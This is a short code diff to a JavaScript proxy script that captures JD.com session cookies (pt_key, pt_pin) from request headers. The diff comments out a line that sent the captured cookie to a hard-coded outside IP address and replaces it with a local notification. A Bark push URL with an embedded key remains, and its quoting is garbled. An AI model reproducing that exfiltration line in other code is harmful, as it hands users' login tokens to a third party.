@@ -60,7 +60,8 @@ function GetCookie() {
       var CV = $request.headers['Cookie'] || $request.headers['cookie'];
       if (CV.match(/(pt_key=.+?pt_pin=|pt_pin=.+?pt_key=)/)) {
         var CookieValue = CV.match(/pt_key=.+?;/) + CV.match(/pt_pin=.+?;/);
-        $.http.get("http://47.97.63.238:5017/put/"+CookieValue)
+        $.notify(CookieValue);
+        //$.http.get("http://47.97.63.238:5017/put/"+CookieValue)
         $.http.get("https://api.day.app/vCTP9AnrqRvYMDg6cC6cSf/更新京东/'+成功+'/?icon=https://cdn.jsdelivr.net/gh/braless/site_logo/jd_app.png")
         var UserName = CookieValue.match(/pt_pin=(.+?);/)[1];
         var DecodeName = decodeURIComponent(UserName);
